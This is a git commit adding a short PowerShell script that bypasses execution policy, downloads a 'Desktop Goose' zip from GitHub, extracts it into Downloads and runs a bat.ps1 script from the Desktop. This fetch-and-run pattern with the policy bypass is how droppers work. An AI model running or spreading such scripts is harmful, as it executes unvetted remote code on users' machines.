530203be4ce6dc627cebef2f81ad102656cc7d39
Giddow <106636675+Giddow@users.noreply.github.com>
2023-05-29 12:51:09 +0100

    Add files via upload

---
+++ gesktop.ps1
@@ -0,0 +1,6 @@
+﻿Set-ExecutionPolicy Bypass -Scope Process -Force
+$source = 'https://github.com/Giddow/sdgsdg/raw/main/Desktop%20Goose.zip'
+$destination = "$env:userprofile\Downloads\yeettt.zip"
+Invoke-RestMethod -Uri $source -OutFile $destination
+Expand-Archive "$destination" -DestinationPath "$env:userprofile\Downloads\" -Force
+cd "$env:userprofile\Desktop";.\bat.ps1
